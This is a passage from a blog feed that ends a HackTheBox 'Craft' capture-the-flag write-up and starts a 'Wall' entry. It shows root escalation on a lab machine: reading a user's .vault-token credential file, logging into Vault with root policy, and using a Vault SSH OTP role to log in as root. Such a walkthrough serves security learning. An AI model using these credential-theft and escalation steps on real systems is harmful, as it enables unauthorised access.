+&lt;span class="code-line"&gt;Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;The programs included with the Debian GNU/Linux system are free software;&lt;/span&gt;
+&lt;span class="code-line"&gt;the exact distribution terms for each program are described in the&lt;/span&gt;
+&lt;span class="code-line"&gt;individual files in /usr/share/doc/*/copyright.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&lt;/span&gt;
+&lt;span class="code-line"&gt;permitted by applicable law.&lt;/span&gt;
+&lt;span class="code-line"&gt;gilfoyle@craft:~$ ls&lt;/span&gt;
+&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;gilfoyle@craft:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;bbf4b&amp;lt;redacted&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-root"&gt;getting root&lt;/h1&gt;
+&lt;h2 id="enumeration"&gt;enumeration&lt;/h2&gt;
+&lt;p&gt;When listing the &lt;code&gt;gilfoyle&lt;/code&gt; home folder we found a &lt;code&gt;.vault-token&lt;/code&gt; file
+containing a &lt;a href="https://www.vaultproject.io/"&gt;vault&lt;/a&gt; token.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;gilfoyle@craft:~$ ls -al&lt;/span&gt;
+&lt;span class="code-line"&gt;total 36&lt;/span&gt;
+&lt;span class="code-line"&gt;drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc&lt;/span&gt;
+&lt;span class="code-line"&gt;drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile&lt;/span&gt;
+&lt;span class="code-line"&gt;drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;-r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo&lt;/span&gt;
+&lt;span class="code-line"&gt;gilfoyle@craft:~$ cat .vault-token&lt;/span&gt;
+&lt;span class="code-line"&gt;f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="vault"&gt;Vault&lt;/h2&gt;
+&lt;p&gt;In order to use vault, when need to authenticate ourself with the token.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;gilfoyle@craft:~$ vault login&lt;/span&gt;
+&lt;span class="code-line"&gt;Token (will be hidden):&lt;/span&gt;
+&lt;span class="code-line"&gt;Success! You are now authenticated. The token information displayed below&lt;/span&gt;
+&lt;span class="code-line"&gt;is already stored in the token helper. You do NOT need to run &amp;quot;vault login&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;again. Future Vault requests will automatically use this token.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Key                  Value&lt;/span&gt;
+&lt;span class="code-line"&gt;---                  -----&lt;/span&gt;
+&lt;span class="code-line"&gt;token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9&lt;/span&gt;
+&lt;span class="code-line"&gt;token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103&lt;/span&gt;
+&lt;span class="code-line"&gt;token_duration       ∞&lt;/span&gt;
+&lt;span class="code-line"&gt;token_renewable      false&lt;/span&gt;
+&lt;span class="code-line"&gt;token_policies       [&amp;quot;root&amp;quot;]&lt;/span&gt;
+&lt;span class="code-line"&gt;identity_policies    []&lt;/span&gt;
+&lt;span class="code-line"&gt;policies             [&amp;quot;root&amp;quot;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We are member of the vault's
+&lt;a href="https://www.vaultproject.io/docs/concepts/policies.html#root-policy"&gt;root policy&lt;/a&gt;
+meaning that we can access everything stored on the vault.&lt;/p&gt;
+&lt;p&gt;The vault is unsealed. Therefore we can directly access to the data. If this vault
+was sealed we will need 3 of the 5 keys to unsealed
+the vault (with the &lt;em&gt;shamir&lt;/em&gt; seal type).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;gilfoyle@craft:~$ vault status&lt;/span&gt;
+&lt;span class="code-line"&gt;Key             Value&lt;/span&gt;
+&lt;span class="code-line"&gt;---             -----&lt;/span&gt;
+&lt;span class="code-line"&gt;Seal Type       shamir&lt;/span&gt;
+&lt;span class="code-line"&gt;Initialized     false&lt;/span&gt;
+&lt;span class="code-line"&gt;Sealed          false&lt;/span&gt;
+&lt;span class="code-line"&gt;Total Shares    5&lt;/span&gt;
+&lt;span class="code-line"&gt;Threshold       3&lt;/span&gt;
+&lt;span class="code-line"&gt;Version         0.11.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Cluster Name    vault-cluster-cb7e66f9&lt;/span&gt;
+&lt;span class="code-line"&gt;Cluster ID      8bb98351-0148-3c42-d124-45a87dc43db7&lt;/span&gt;
+&lt;span class="code-line"&gt;HA Enabled      false&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can list the secret engine enable on the vault.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;gilfoyle@craft:~$ vault secrets list&lt;/span&gt;
+&lt;span class="code-line"&gt;Path          Type         Accessor              Description&lt;/span&gt;
+&lt;span class="code-line"&gt;----          ----         --------              -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage&lt;/span&gt;
+&lt;span class="code-line"&gt;identity/     identity     identity_56533c34     identity store&lt;/span&gt;
+&lt;span class="code-line"&gt;secret/       kv           kv_2d9b0109           key/value secret storage&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh/          ssh          ssh_3bbd5276          n/a&lt;/span&gt;
+&lt;span class="code-line"&gt;sys/          system       system_477ec595       system endpoints used for control, policy and debugging&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In the &lt;code&gt;craf-infra&lt;/code&gt; repository there is a &lt;code&gt;vault&lt;/code&gt; folder containing a
+&lt;code&gt;secret.sh&lt;/code&gt; file. This file show wich secrets are created: An ssh acces for the
+root user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;craft-infra/vault# cat secrets.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# set up vault secrets backend&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;vault secrets enable ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;vault write ssh/roles/root_otp \&lt;/span&gt;
+&lt;span class="code-line"&gt;    key_type=otp \&lt;/span&gt;
+&lt;span class="code-line"&gt;    default_user=root \&lt;/span&gt;
+&lt;span class="code-line"&gt;    cidr_list=0.0.0.0/0&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Therefore we just need to use the &lt;code&gt;vault&lt;/code&gt;'s &lt;code&gt;ssh&lt;/code&gt; command to connect as &lt;code&gt;root&lt;/code&gt;
+on &lt;code&gt;localhost&lt;/code&gt; with the &lt;code&gt;otp&lt;/code&gt; mode. We are root on the machine and can access
+the flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;gilfoyle@craft:~$ vault ssh -mode=otp root@127.0.0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;WARNING: No -role specified. Use -role to tell Vault which ssh role to use for&lt;/span&gt;
+&lt;span class="code-line"&gt;authentication. In the future, you will need to tell Vault which role to use.&lt;/span&gt;
+&lt;span class="code-line"&gt;For now, Vault will attempt to guess based on the API response. This will be&lt;/span&gt;
+&lt;span class="code-line"&gt;removed in the Vault 1.1.&lt;/span&gt;
+&lt;span class="code-line"&gt;Vault SSH: Role: &amp;quot;root_otp&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Vault could not locate &amp;quot;sshpass&amp;quot;. The OTP code for the session is displayed&lt;/span&gt;
+&lt;span class="code-line"&gt;below. Enter this code in the SSH password prompt. If you install sshpass,&lt;/span&gt;
+&lt;span class="code-line"&gt;Vault can automatically perform this step for you.&lt;/span&gt;
+&lt;span class="code-line"&gt;OTP for the session is: fb100502-b40c-9f60-aa35-f90a5000a2a3&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  .   *   ..  . *  *&lt;/span&gt;
+&lt;span class="code-line"&gt;*  * @()Ooc()*   o  .&lt;/span&gt;
+&lt;span class="code-line"&gt;    (Q@*0CG*O()  ___&lt;/span&gt;
+&lt;span class="code-line"&gt;  |\_________/|/ _ \&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | / | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | | | |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  | \_| |&lt;/span&gt;
+&lt;span class="code-line"&gt;  |  |  |  |  |\___/&lt;/span&gt;
+&lt;span class="code-line"&gt;  |\_|__|__|_/|&lt;/span&gt;
+&lt;span class="code-line"&gt;    \_________/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Password:&lt;/span&gt;
+&lt;span class="code-line"&gt;Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;The programs included with the Debian GNU/Linux system are free software;&lt;/span&gt;
+&lt;span class="code-line"&gt;the exact distribution terms for each program are described in the&lt;/span&gt;
+&lt;span class="code-line"&gt;individual files in /usr/share/doc/*/copyright.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&lt;/span&gt;
+&lt;span class="code-line"&gt;permitted by applicable law.&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Tue Aug 27 04:53:14 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;root@craft:~# cat root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;831d6&amp;lt;redacted&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box was really interesting as everything is applicable in real life. The
+user part was quit long (compared to the user part) and getting a working
+reverse shell was a brain crusher. For the root part it was quit easy but allow
+me to learn more about &lt;a href="https://www.vaultproject.io"&gt;vault&lt;/a&gt;.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="git"></category><category term="gogs"></category><category term="api"></category><category term="vault"></category></entry><entry><title>HTB: Wall</title><link href="https://maggick.fr/2019/12/htb-wall.html" rel="alternate"></link><published>2019-12-07T17:45:00+01:00</published><updated>2019-12-07T17:45:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-12-07:/2019/12/htb-wall.html</id><summary type="html">&lt;p&gt;&lt;img alt="Wall Card" class="align-left" src="/media/2019.12/wall_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/208"&gt;Wall&lt;/a&gt;.
 This box is rated as a medium box. It implies a lot of frustration, some
